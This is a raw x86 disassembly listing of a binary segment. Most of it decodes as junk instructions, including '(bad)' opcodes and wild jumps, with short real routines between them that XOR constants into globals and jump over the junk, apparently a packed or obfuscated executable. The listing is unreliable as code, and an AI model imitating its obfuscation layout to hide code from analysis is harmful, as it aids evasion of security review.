  4094fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094ff:	cwde   
  409500:	push   cs
  409501:	(bad)  
  409502:	popa   
  409503:	pop    es
  409504:	xor    eax,0x4f61fc7b
  409509:	int3   
  40950a:	jge    0x4094e4
  40950c:	pop    eax
  40950d:	(bad)  
  40950e:	imul   ebx,DWORD PTR [esi+0x3b62b409],0xe5633597
  409518:	cmp    DWORD PTR [ebp+0x2c],esi
  40951b:	retf   
  40951c:	pop    es
  40951d:	and    DWORD PTR [esi+ecx*8],0xe42fa0a1
  409524:	cld    
  409525:	or     BYTE PTR [esi-0x8],dl
  409528:	retf   0x3c66
  40952b:	cdq    
  40952c:	rcr    DWORD PTR [eax+0x77621235],cl
  409532:	inc    eax
  409533:	xor    bl,BYTE PTR [ecx]
  409535:	cmp    al,0xfa
  409537:	or     eax,0x169334d7
  40953c:	xchg   BYTE PTR ds:0x66a53fd2,bl
  409542:	jle    0x409542
  409544:	adc    dl,BYTE PTR [esi]
  409546:	push   ds
  409547:	repnz inc eax
  409549:	stc    
  40954a:	add    al,0x78
  40954c:	aaa    
  40954d:	inc    esi
  40954e:	mov    cl,BYTE PTR [ebx+0x20]
  409551:	push   esi
  409552:	les    ebx,FWORD PTR [edx]
  409554:	lock jnp 0x409531
  409557:	loopne 0x409530
  409559:	idiv   DWORD PTR [edi+0x5a]
  40955c:	repnz push esi
  40955e:	or     DWORD PTR [eax],ecx
  409560:	pop    ebp
  409561:	sub    eax,0xe79ecf8e
  409566:	sbb    DWORD PTR [esi+edx*2-0x1c192473],esp
  40956d:	mov    dh,BYTE PTR [ebx]
  40956f:	loop   0x409555
  409571:	xchg   ebp,eax
  409572:	sbb    BYTE PTR ds:0xe32c9ec8,dl
  409578:	dec    esi
  409579:	xchg   DWORD PTR [edi-0x730b7f79],eax
  40957f:	and    al,0xd5
  409581:	cld    
  409582:	shl    DWORD PTR [edx-0x14ae3c2c],cl
  409588:	in     al,0xb1
  40958a:	(bad)  
  40958b:	(bad)  
  40958c:	aam    0x82
  40958e:	jmp    0x6b053302
  409593:	xor    ch,al
  409595:	in     eax,dx
  409596:	jmp    0x40956c
  409598:	sub    eax,0xcdac8fcb
  40959d:	imul   DWORD PTR [edx+0x4cbf9754]
  4095a3:	sar    BYTE PTR [eax-0xd],0xe9
  4095a7:	shl    DWORD PTR [eax+0x41871464],0x17
  4095ae:	neg    edx
  4095b0:	pop    edx
  4095b1:	mov    ds:0x527b8292,eax
  4095b6:	cs ss aaa 
  4095b9:	outs   dx,BYTE PTR ds:[esi]
  4095ba:	pop    ecx
  4095bb:	dec    ebx
  4095bc:	sar    BYTE PTR [ebx+0x30],0x58
  4095c0:	jnp    0x40959b
  4095c2:	pop    ss
  4095c3:	imul   esi,DWORD PTR [ebp-0x42f4a805],0xd4476f7e
  4095cd:	in     al,0x66
  4095cf:	pop    ds
  4095d0:	adc    ecx,DWORD PTR [ebx+0x7d]
  4095d3:	push   edi
  4095d4:	sbb    al,0x55
  4095d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095d7:	int    0x5
  4095d9:	add    al,BYTE PTR [eax+0x48]
  4095dc:	mov    esp,0x935a6e1c
  4095e1:	jmp    0xce8a008e
  4095e6:	dec    edi
  4095e7:	pop    edi
  4095e8:	test   DWORD PTR [esi],edi
  4095ea:	call   0x406b0f
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8e87:0x97450f4e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	cli    
  40960d:	outs   dx,DWORD PTR ds:[esi]
  40960e:	test   al,0xe9
  409610:	push   ss
  409611:	in     eax,0xc4
  409613:	and    al,BYTE PTR [ebp-0x77]
  409616:	ret    0x286d
  409619:	mov    ebp,0x52b3252f
  40961e:	adc    dl,BYTE PTR [esi]
  409620:	cli    
  409621:	sub    eax,esp
  409623:	xor    BYTE PTR [edi+0x28],0x9f
  409627:	inc    esp
  409628:	xor    eax,0x90a7699d
  40962d:	cmc    
  40962e:	push   ecx
  40962f:	cwde   
  409630:	mov    eax,0xd22e3205
  409635:	mov    dh,0xbe
  409637:	xchg   ebp,eax
  409638:	repnz or esp,edi
  40963b:	dec    ecx
  40963c:	jg     0x4096b9
  40963e:	imul   esi,DWORD PTR [ebx+0x4f],0xb
  409642:	or     ch,ch
  409644:	ins    DWORD PTR es:[edi],dx
  409645:	lock inc edx
  409647:	add    BYTE PTR [edx-0x1a],ah
  40964a:	mov    es,WORD PTR [eax]
  40964c:	lahf   
  40964d:	mov    ch,0x8c
  40964f:	pop    ds
  409650:	and    esi,edx
  409652:	jne    0x409633
  409654:	push   ax
  409656:	icebp  
  409657:	es (bad) 
  409659:	fsub   st(6),st
  40965b:	sbb    al,BYTE PTR [edx+eiz*1+0x57]
  40965f:	cmp    ebx,DWORD PTR [edi]
  409661:	ret    
  409662:	inc    esi
  409663:	cmp    DWORD PTR [ebx],0xffffffd1
  409666:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409667:	add    al,0xa7
  409669:	jno    0x4096b7
  40966b:	sbb    ebp,ebp
  40966d:	cmp    ecx,DWORD PTR [eax+0x6aac0cb3]
  409673:	sbb    ch,BYTE PTR [eax-0xa]
  409676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409677:	enter  0x2322,0xcc
  40967b:	push   ss
  40967c:	mov    esp,cs
  40967e:	xor    BYTE PTR [esi-0x4c],dl
  409681:	pop    esp
  409682:	or     al,0x16
  409684:	sub    DWORD PTR [eax+0x4c5a0e9f],0x25
  40968b:	sbb    eax,0xae456354
  409690:	inc    edx
  409691:	out    dx,al
  409692:	add    eax,0x48db72e
  409697:	jmp    0x10627d3b
  40969c:	inc    edx
  40969d:	xor    dh,bl
  40969f:	(bad)  
  4096a0:	popf   
  4096a1:	mov    al,0xad
  4096a3:	jbe    0x4096b3
  4096a5:	jge    0x4096b7
  4096a7:	fwait
  4096a8:	push   eax
  4096a9:	shl    BYTE PTR [eax-0x3d],1
  4096ac:	es scas eax,DWORD PTR es:[edi]
  4096ae:	fcmovb st,st(5)
  4096b0:	jbe    0x4096e4
  4096b2:	mov    ss,WORD PTR [ecx+esi*8+0x538d7276]
  4096b9:	jne    0x40970f
  4096bb:	pop    ecx
  4096bc:	xchg   edx,eax
  4096bd:	xchg   DWORD PTR [edx],ebx
  4096bf:	jge    0x40971b
  4096c1:	cld    
  4096c2:	test   BYTE PTR [edx+0x1b7a819f],0xc6
  4096c9:	(bad)
  4096cd:	mov    edi,0xb53ff371
  4096d2:	cmp    al,0xa9
  4096d4:	adc    ebp,0x51
  4096d7:	out    dx,eax
  4096d8:	dec    edx
  4096d9:	call   0x612fc3be
  4096de:	push   esp
  4096df:	xor    esp,DWORD PTR [ebp-0x3e]
  4096e2:	out    dx,eax
  4096e3:	sub    al,0xa
  4096e5:	pop    ebx
  4096e6:	aas    
  4096e7:	stos   BYTE PTR es:[edi],al
  4096e8:	mov    bh,bh
  4096ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096eb:	xchg   ecx,eax
  4096ec:	lds    edx,FWORD PTR [ebp-0x7d]
  4096ef:	or     edi,DWORD PTR [esi+0x508ea63d]
  4096f5:	outs   dx,DWORD PTR ds:[esi]
  4096f6:	cmp    BYTE PTR [ecx-0x72c77003],cl
  4096fc:	pop    es
  4096fd:	div    BYTE PTR [ebx+0x5b]
  409700:	sub    al,0x1c
  409702:	adc    BYTE PTR [eax+0x6d],al
  409705:	mov    ch,0xb2
  409707:	lahf   
  409708:	fadd   DWORD PTR [ebp-0x6df12fd2]
  40970e:	xor    eax,DWORD PTR [ecx-0x52]
  409711:	push   ds
  409712:	jns    0x40976b
  409714:	dec    ebp
  409715:	mov    al,0x30
  409717:	xchg   ebx,eax
  409718:	jno    0x40972a
  40971a:	pop    ecx
  40971b:	ss ret 
  40971d:	mov    ecx,0x77d5a287
  409722:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409723:	mov    bl,0x3c
  409725:	push   edx
  409726:	adc    al,0x41
  409728:	call   0x2783:0xd756c77f
  40972f:	bound  esp,QWORD PTR [edx]
  409731:	in     al,0xa4
  409733:	jne    0x409729
  409735:	mov    cl,0x9b
  409737:	sti    
  409738:	cdq    
  409739:	loope  0x409774
  40973b:	test   edx,0xcd183e6a
  409741:	sahf   
  409742:	inc    ebx
  409743:	shr    DWORD PTR [ebx],cl
  409745:	mov    esp,0xda18b796
  40974a:	stc    
  40974b:	mov    BYTE PTR [esi+0x79],al
  40974e:	jmp    0x707a:0xb0bbbfef
  409755:	aam    0x48
  409757:	daa    
  409758:	mov    bh,0xc4
  40975a:	(bad)  
  40975b:	mov    ch,0xa8
  40975d:	pop    es
  40975e:	test   al,dl
  409760:	rcl    BYTE PTR [esp+esi*1+0x5a],1
  409764:	mov    edi,0x44dbf0e8
  409769:	adc    ecx,DWORD PTR [ebx+0x2a879dc7]
  40976f:	in     eax,dx
  409770:	fstp   TBYTE PTR [edi+0x5b]
  409773:	loop   0x409780
  409775:	(bad)  
  409776:	jns    0x409760
  409778:	or     DWORD PTR [esi+0x2fbed509],esi
  40977e:	xchg   ebp,eax
  40977f:	cmp    DWORD PTR [edi],ebp
  409781:	or     DWORD PTR [ebp-0xb],esp
  409784:	push   eax
  409785:	xchg   bp,ax
  409787:	scas   eax,DWORD PTR es:[edi]
  409788:	imul   esp,DWORD PTR [ecx-0x6b80096b],0x2
  40978f:	ins    BYTE PTR es:[edi],dx
  409790:	dec    eax
  409791:	or     ah,BYTE PTR [ebx-0x41]
  409794:	ja     0x55680d5
  40979a:	leave  
  40979b:	popf   
  40979c:	data16 mov al,cl
  40979f:	adc    eax,0x2c56b797
  4097a4:	out    0x90,eax
  4097a6:	in     al,0x1d
  4097a8:	popa   
  4097a9:	enter  0xb3c9,0xb9
  4097ad:	(bad)  
  4097ae:	adc    dl,ch
  4097b0:	add    eax,DWORD PTR [edx-0x5213f23a]
  4097b6:	pop    ds
  4097b7:	in     eax,0xa2
  4097b9:	mov    ecx,0xdaf242cc
  4097be:	push   ds
  4097bf:	ret    0x543d
  4097c2:	adc    DWORD PTR [ebx+esi*4+0x16],edx
  4097c6:	sub    DWORD PTR [edi-0x7b],ebp
  4097c9:	or     DWORD PTR [ebx-0x6],edi
  4097cc:	in     al,dx
  4097cd:	push   ss
  4097ce:	mov    dh,0xf4
  4097d0:	shl    DWORD PTR [ecx-0x7d],0x6a
  4097d4:	jge    0x4097d9
  4097d6:	enter  0xbce0,0x74
  4097da:	dec    ebp
  4097db:	and    edx,ebp
  4097dd:	and    DWORD PTR [edi],esp
  4097df:	shr    edi,0x1b
  4097e2:	hlt    
  4097e3:	xor    esp,ecx
  4097e5:	jmp    0x1b7da3b4
  4097ea:	jmp    0x7f75b5ad
  4097ef:	(bad)  
  4097f0:	mov    bl,0x6d
  4097f2:	in     eax,0xf4
  4097f4:	dec    edi
  4097f5:	cmp    esp,DWORD PTR [eax]
  4097f7:	mov    DWORD PTR [ebx+ebp*4-0x8196d89],esp
  4097fe:	sbb    DWORD PTR [ebx],ebp
  409800:	inc    ebp
  409801:	xchg   ebx,eax
  409802:	mov    dl,al
  409804:	mov    dl,0x1d
  409806:	int    0x92
  409808:	jne    0x4097ef
  40980a:	arpl   WORD PTR [ebx-0x3d],di
  40980d:	mov    dl,0xe6
  40980f:	cli    
  409810:	ficom  WORD PTR [ebp-0x37]
  409813:	mov    edi,0x444d799f
  409818:	and    eax,0xff37c7d5
  40981d:	lods   al,BYTE PTR ds:[esi]
  40981e:	sahf   
  40981f:	nop
  409820:	or     edi,0xccdcbf5c
  409826:	add    BYTE PTR [edi-0x2f],0x3f
  40982a:	pop    es
  40982b:	cmp    BYTE PTR [eax+ecx*1+0x10],dl
  40982f:	aam    0x7e
  409831:	or     DWORD PTR [edi+0x21],0x73
  409835:	cdq    
  409836:	mov    eax,DWORD PTR [ebp-0xc]
  409839:	cmp    eax,ebx
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x4336df
  40986f:	xor    DWORD PTR ds:0x433617,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x4336db,0x4336ab
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x433667,0x433713
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x4335fb
  4098a6:	sub    DWORD PTR ds:0x4336df,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	into   
  4098c1:	mov    edx,0xd9b429f5
  4098c6:	jle    0x409946
  4098c8:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  4098cc:	and    esp,DWORD PTR [edx-0x576fa11c]
  4098d2:	or     eax,0xded78bc1
  4098d7:	(bad)  
  4098d8:	jb     0x409951
  4098da:	js     0x409937
  4098dc:	push   ebp
  4098dd:	nop
  4098de:	nop
  4098df:	or     BYTE PTR [ebx+0x4949f4ba],al
  4098e5:	fcomp  QWORD PTR [edi+edi*1+0x5aeb0b7f]
  4098ec:	pop    edi
  4098ed:	enter  0x77d6,0xb3
  4098f1:	ja     0x409881
  4098f3:	cld    
  4098f4:	lods   al,BYTE PTR ds:[esi]
  4098f5:	scas   al,BYTE PTR es:[edi]
  4098f6:	in     al,0x0
  4098f8:	cmp    dl,BYTE PTR [eax+esi*8-0x3d5f27cd]
  4098ff:	stos   BYTE PTR es:[edi],al
  409900:	arpl   WORD PTR ds:[edi+0x1a],dx
  409904:	jle    0x40993d
  409906:	xchg   DWORD PTR [ebx-0x6065eb06],edi
  40990c:	add    edi,DWORD PTR [ecx+0x7e]
  40990f:	fwait
  409910:	lods   al,BYTE PTR ds:[esi]
  409911:	xchg   ecx,eax
  409912:	xchg   ecx,eax
  409913:	popa   
  409914:	sbb    BYTE PTR [ebp-0x25],ch
  409917:	pop    ebp
  409918:	(bad)  
  409919:	cwde   
  40991a:	arpl   WORD PTR [edx-0x55021d69],di
  409920:	inc    esp
  409921:	test   al,0x1c
  409923:	mov    ebp,0xe8bf043f
  409928:	test   eax,0x67109e2
  40992d:	outs   dx,BYTE PTR ds:[esi]
  40992e:	or     edi,DWORD PTR ds:0x978a4b94
  409934:	addr16 pop edi
  409936:	adc    al,0xac
  409938:	hlt    
  409939:	arpl   bp,ax
  40993b:	pop    ss
  40993c:	leave  
  40993d:	repnz test BYTE PTR [edx+0x11],dh
  409941:	sub    ch,BYTE PTR [esp+ecx*1+0x7e]
  409945:	jge    0x409993
  409947:	inc    edx
  409948:	add    eax,0x9fa6d4ae
  40994d:	stos   DWORD PTR es:[edi],eax
  40994e:	mov    dh,0x61
  409950:	imul   ecx,DWORD PTR [ecx+ecx*4+0x60],0xffffffbb
  409955:	fldenv [ecx]
  409957:	scas   al,BYTE PTR es:[edi]
  409958:	(bad)  
  409959:	sti    
  40995a:	pushf  
  40995b:	arpl   cx,si
  40995d:	mov    esi,DWORD PTR [ecx+0x2f73f0a1]
  409963:	pop    edi
  409964:	push   ecx
  409965:	jne    0x40990a
  409967:	pusha  
  409968:	mov    edi,0x6105037d
  40996d:	mov    eax,ds:0x9b579a7f
  409972:	mov    ebx,0xb810f563
  409977:	inc    esi
  409978:	mov    ah,0x11
  40997a:	pop    ebp
  40997b:	nop
  40997c:	(bad)  
  40997d:	(bad)  
  40997f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409980:	fimul  WORD PTR [esi+edi*4-0x64]
  409984:	mov    dh,0xf7
  409986:	test   al,0x83
  409988:	jae    0x409948
  40998a:	and    BYTE PTR [edi+0x1528a818],bh
  409990:	fsub   st(5),st
  409992:	test   eax,0x78083d52
  409997:	rcl    ecx,cl
  409999:	sub    BYTE PTR [ecx-0x20],al
  40999c:	je     0x409a13
  40999e:	shl    DWORD PTR [ebx+0x3213795],cl
  4099a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099a5:	outs   dx,DWORD PTR ds:[esi]
  4099a6:	xchg   esi,eax
  4099a7:	jbe    0x40996d
  4099a9:	(bad)
  4099ae:	adc    eax,0xb929d71b
  4099b3:	sub    al,bl
  4099b5:	xlat   BYTE PTR ds:[ebx]
  4099b6:	or     al,0x76
  4099b8:	hlt    
  4099b9:	or     ebx,DWORD PTR [ecx-0x31a6998f]
  4099bf:	add    BYTE PTR [edi],ch
  4099c1:	xor    eax,0x8ff1e769
  4099c6:	in     eax,dx
  4099c7:	out    0x97,eax
  4099c9:	dec    ebp
  4099ca:	xor    eax,0x8d617b42
  4099cf:	sub    al,0xbf
  4099d1:	jno    0x4099a7
  4099d3:	in     eax,0x81
  4099d5:	rcr    BYTE PTR [ebx+0x63],0x76
  4099d9:	xchg   edx,eax
  4099da:	cli    
  4099db:	shr    cl,1
  4099dd:	data16 jmp 0x409984
  4099e0:	sbb    bh,ch
  4099e2:	nop
  4099e3:	rol    BYTE PTR [edi+0x77745d2b],cl
  4099e9:	imul   eax,ecx,0x24f4fd19
  4099ef:	cmp    ecx,DWORD PTR [edi]
  4099f1:	dec    ebp
  4099f2:	in     al,0xaa
  4099f4:	inc    esp
  4099f5:	(bad)  
  4099f6:	ins    BYTE PTR es:[edi],dx
  4099f7:	ret    
  4099f8:	mov    bh,0xd0
  4099fa:	out    dx,al
  4099fb:	loop   0x409a7c
  4099fd:	and    al,0xf1
  4099ff:	mov    ebp,0x565ebe0
  409a04:	mov    al,0x57
  409a06:	cmp    BYTE PTR [edx],cl
  409a08:	mov    WORD PTR [edx+0x7e],?
  409a0b:	cmp    dl,BYTE PTR [edi+0x4661c3f6]
  409a11:	aam    0xad
  409a13:	mov    ss:0x61f0a5b7,eax
  409a19:	(bad)  [esp+edi*4+0x4b]
  409a1d:	(bad)  
  409a1e:	xlat   BYTE PTR ds:[ebx]
  409a1f:	scas   eax,DWORD PTR es:[edi]
  409a20:	ins    BYTE PTR es:[edi],dx
  409a21:	mov    cl,0x8a
  409a23:	sub    al,0x80
  409a25:	xchg   ebp,eax
  409a26:	and    DWORD PTR [edx+0x46f63e68],edx
  409a2c:	xchg   BYTE PTR [ecx],bh
  409a2e:	in     al,0x2d
  409a30:	lods   eax,DWORD PTR ds:[esi]
  409a31:	std    
  409a32:	ins    DWORD PTR es:[edi],dx
  409a33:	enter  0xbeca,0x43
  409a37:	mov    ebp,0x8f6d69e3
  409a3c:	fst    QWORD PTR [ebx-0x15]
  409a3f:	mov    dl,0x9d
  409a41:	cli    
  409a42:	xor    eax,0x3c95c902
  409a47:	mov    bl,0x15
  409a49:	stos   DWORD PTR es:[edi],eax
  409a4a:	inc    ecx
  409a4b:	fs pop esp
  409a4d:	jp     0x409a4e
  409a4f:	push   ss
  409a50:	adc    al,0x73
  409a52:	push   ebx
  409a53:	repz sti 
  409a55:	mov    eax,0xca923271
  409a5a:	mov    ecx,0x4f4c500c
  409a5f:	mov    bl,0x75
  409a61:	rol    BYTE PTR [edx+0xa7ee4f7],cl
  409a67:	mov    bh,0x50
  409a69:	push   eax
  409a6a:	data16 out dx,al
  409a6c:	cmp    dl,BYTE PTR [esi-0x2bd7b871]
  409a72:	and    DWORD PTR [edi-0x8],edi
  409a75:	in     eax,dx
  409a76:	add    edx,DWORD PTR gs:[eax-0x352dd35a]
  409a7d:	push   0x64
  409a7f:	out    dx,eax
  409a80:	js     0x409a8a
  409a82:	xchg   ebx,eax
  409a83:	or     eax,0x6133f4f1
  409a88:	push   ds
  409a89:	sub    dh,BYTE PTR [esi+0xab11358]
  409a8f:	jb     0x409aeb
  409a91:	arpl   WORD PTR [edi+edx*4-0x4bef1986],ax
  409a98:	les    ecx,FWORD PTR [esi]
  409a9a:	push   edi
  409a9b:	adc    DWORD PTR [edx+0x78],eax
  409a9e:	or     bl,ah
  409aa0:	fs mov eax,0xb4745461
  409aa6:	bound  ecx,QWORD PTR [edx]
  409aa8:	fwait
  409aa9:	mov    WORD PTR ds:0x1405e883,?
  409aaf:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ab1:	push   es
  409ab2:	sub    BYTE PTR [edi+eax*1+0x2b],0x1f
  409ab7:	fild   DWORD PTR [esi+0x7a]
  409aba:	cmp    BYTE PTR [edx-0x75],0x60
  409abe:	xor    eax,0x1a9a73b8
  409ac3:	je     0x409b24
  409ac5:	loop   0x409a6d
  409ac7:	idiv   edi
  409ac9:	(bad)  
  409acc:	lods   al,BYTE PTR ds:[esi]
  409acd:	push   edx
  409ace:	ja     0x409a7c
  409ad0:	fwait
  409ad1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ad2:	dec    eax
  409ad3:	out    dx,al
  409ad4:	add    ebp,DWORD PTR [edi-0x748c8d1c]
  409ada:	setne  BYTE PTR [ebp+0x1d9f400c]
  409ae1:	jg     0x409b09
  409ae3:	mov    bh,BYTE PTR [esi-0x2a00b5d4]
  409ae9:	xchg   esi,eax
  409aea:	pop    edi
  409aeb:	cmp    edx,DWORD PTR [eax+0x3b91bad6]
  409af1:	sbb    al,0x30
  409af3:	sub    BYTE PTR [edi+ecx*2-0x42c6a6b5],dh
  409afa:	jo     0x409b23
  409afc:	mov    edi,0x6509dba
  409b01:	mov    dh,0x40
  409b03:	js     0x409af3
  409b05:	push   edi
  409b06:	sbb    al,0x7
  409b08:	fadd   QWORD PTR [ebx-0x63fbf54]
  409b0e:	xor    cl,BYTE PTR [ebx]
  409b10:	(bad)  
  409b11:	std    
  409b12:	push   esi
  409b13:	push   edi
  409b14:	sbb    DWORD PTR ds:0x43369f,0x433653
  409b1e:	jmp    0x409d81
  409b23:	lds    esp,FWORD PTR [edi-0x2e932d54]
  409b29:	popa   
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi-0x11dbfc2c]
  409b32:	jmp    0x7ebf7fb5
  409b37:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409b3b:	xchg   edx,eax
  409b3c:	cmc    
  409b3d:	cdq    
  409b3e:	idiv   DWORD PTR [ecx-0x53]
  409b41:	pop    edx
  409b42:	out    0xa7,al
  409b44:	xchg   esp,eax
  409b45:	or     al,0xf3
  409b47:	push   eax
  409b48:	bound  ebp,QWORD PTR [edi+0x6d]
  409b4b:	or     BYTE PTR [eax+0x7387ab27],bh
  409b51:	shr    BYTE PTR [edx-0x7d092194],cl
  409b57:	mov    ecx,0xf4ebf490
  409b5c:	mov    ebp,0x27802d0e
  409b61:	inc    esi
  409b62:	push   edi
  409b63:	xlat   BYTE PTR ds:[ebx]
  409b64:	pop    ds
  409b65:	popa   
  409b66:	sub    al,0x4
  409b68:	pop    edi
  409b69:	ss dec esi
  409b6b:	loopne 0x409b02
  409b6d:	fadd   QWORD PTR [esi+ecx*4+0x693ff8f5]
  409b74:	ja     0x409b7d
  409b76:	and    cl,BYTE PTR [esi+0x3]
  409b79:	fmul   DWORD PTR ds:0xfb072d35
  409b7f:	pop    edx
  409b80:	retf   
  409b81:	gs mov bl,0x8a
  409b84:	mov    al,ds:0x104eb069
  409b89:	or     BYTE PTR [ebx-0x7f],ah
  409b8c:	jge    0x409b20
  409b8e:	aas    
  409b8f:	push   esp
  409b90:	sbb    bh,dh
  409b92:	pop    ebp
  409b93:	mov    bh,0x2b
  409b95:	fstp   TBYTE PTR [ebp+ebp*1+0x7f0b2874]
  409b9c:	mov    ecx,0x479a3018
  409ba1:	sbb    DWORD PTR ds:0xa17d0be6,ebp
  409ba7:	fs out 0xc9,al
  409baa:	jmp    0x2c5dbd17
  409baf:	lahf   
  409bb0:	ins    BYTE PTR es:[edi],dx
  409bb1:	pusha  
  409bb2:	mov    cl,0x6e
  409bb4:	out    0xc2,al
  409bb6:	jne    0x409b6e
  409bb8:	jp     0x409c14
  409bba:	shl    al,0xd1
  409bbd:	inc    esi
  409bbe:	(bad)  
  409bbf:	jecxz  0x409b91
  409bc1:	ror    DWORD PTR [ecx-0x149a9e1b],cl
  409bc7:	shr    bh,cl
  409bc9:	(bad)  
  409bca:	xchg   esi,eax
  409bcb:	ror    DWORD PTR [eax+ebx*4-0x27],0x9b
  409bd0:	jnp    0x409bfa
  409bd2:	sub    ebp,DWORD PTR [ebp-0x34]
  409bd5:	jge    0x409bab
  409bd7:	dec    eax
  409bd8:	adc    dh,BYTE PTR [ecx+0x502cf879]
  409bde:	or     DWORD PTR [eax],edi
  409be0:	xor    ebp,edi
  409be2:	pop    ecx
  409be3:	fmul   DWORD PTR ds:0xaa69bbc7
  409be9:	je     0x409be2
  409beb:	out    0x46,eax
  409bed:	jl     0x409bed
  409bef:	pushf  
  409bf0:	and    BYTE PTR [eax-0x356e7551],0x5
  409bf7:	out    0x3c,al
  409bf9:	jnp    0x409bea
  409bfb:	sub    eax,0xe114497f
  409c00:	arpl   WORD PTR [eax+edx*8+0x72],si
  409c04:	out    0x64,eax
  409c06:	jmp    DWORD PTR [esi-0x5b]
  409c09:	pop    esi
  409c0a:	cmp    eax,esp
  409c0c:	outs   dx,BYTE PTR ds:[esi]
  409c0d:	adc    cl,ch
  409c0f:	sbb    eax,0x6a40a49f
  409c14:	lea    esp,[ebx]
  409c16:	cmp    DWORD PTR [edx-0x427c8fda],edx
  409c1c:	or     ebp,DWORD PTR [edi]
  409c1e:	loopne 0x409bf2
  409c20:	jl     0x409c83
  409c22:	ss es nop
  409c25:	fs test al,bl
  409c28:	sub    BYTE PTR [edi],cl
  409c2a:	xchg   ecx,eax
  409c2b:	into   
  409c2c:	outs   dx,BYTE PTR ds:[esi]
  409c2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c2e:	dec    esi
  409c2f:	inc    esp
  409c30:	pop    ecx
  409c31:	div    DWORD PTR [esi+0x10]
  409c34:	bnd jle 0x409bee
  409c37:	inc    eax
  409c38:	xchg   edx,eax
  409c39:	adc    DWORD PTR [esp+eax*1-0x1291144c],esi
  409c40:	sub    BYTE PTR ds:0xf9c6085d,bl
  409c46:	sbb    eax,0x543d20c
  409c4b:	adc    DWORD PTR [esi+0x5be92180],ebx
  409c51:	xchg   ebp,eax
  409c52:	pop    eax
  409c53:	xchg   esp,eax
  409c54:	ds xchg ebp,eax
  409c56:	xor    eax,0xbc0fb3b5
  409c5b:	sbb    ch,ch
  409c5d:	popf   
  409c5e:	push   cs
  409c5f:	data16 mov cl,BYTE PTR [ebx-0x35dcc49a]
  409c66:	dec    esi
  409c67:	inc    ebp
  409c68:	pop    edi
  409c69:	pop    eax
  409c6a:	cdq    
  409c6b:	ficom  WORD PTR [eax]
  409c6d:	out    0x2a,eax
  409c6f:	mov    al,0xaf
  409c71:	and    al,0x96
  409c73:	int    0x90
  409c75:	test   BYTE PTR [ebp+ecx*8+0x7f],ah
  409c79:	fcom   QWORD PTR [edi]
  409c7b:	ret    0x4a8
  409c7e:	inc    edx
  409c7f:	mov    ecx,0xfc65b6c9
  409c84:	aaa    
  409c85:	and    al,0x3f
  409c87:	sbb    edx,DWORD PTR [esi]
  409c89:	mov    ch,0x10
  409c8b:	inc    ebp
  409c8c:	(bad)  
  409c8d:	sub    ebp,DWORD PTR [ebp+0x1f513359]
  409c93:	fisttp QWORD PTR [eax+0x19e7c951]
  409c99:	aad    0x81
  409c9b:	leave  
  409c9c:	inc    ebp
  409c9d:	adc    eax,0x14d12f18
  409ca2:	mov    dh,0x3f
  409ca4:	in     eax,0xc6
  409ca6:	jl     0x409c3d
  409ca8:	pop    esp
  409ca9:	push   ds
  409caa:	push   eax
  409cab:	dec    edi
  409cac:	(bad)  
  409cad:	pop    ss
  409cae:	dec    edi
  409caf:	dec    edi
  409cb0:	push   esp
  409cb1:	cmp    esp,DWORD PTR [ebp-0x1a64f6ac]
  409cb7:	sbb    eax,0xffffff9b
  409cba:	rol    DWORD PTR [ecx],1
  409cbc:	sub    al,0x3
  409cbe:	adc    cl,bl
  409cc0:	xor    DWORD PTR [esi-0x3b871700],ebx
  409cc6:	fdivr  QWORD PTR [esi-0x5b]
  409cc9:	hlt    
  409cca:	sub    eax,0x2e5dba03
  409ccf:	sbb    bh,dl
  409cd1:	test   eax,0xb847baf4
  409cd6:	xchg   ebx,eax
  409cd7:	outs   dx,BYTE PTR ds:[esi]
  409cd8:	sub    edi,DWORD PTR [ecx+ebx*4+0x2180b22b]
  409cdf:	out    0xac,eax
  409ce1:	pop    esi
  409ce2:	inc    esp
  409ce3:	xor    DWORD PTR [ebx],ebp
  409ce5:	test   DWORD PTR [ebp+edx*4-0x32],ebp
  409ce9:	clc    
  409cea:	in     eax,0x61
  409cec:	pop    ds
  409ced:	mov    ch,bl
  409cef:	mov    ecx,0x9b518b0f
  409cf4:	(bad)  
  409cf6:	pusha  
  409cf7:	or     al,0xae
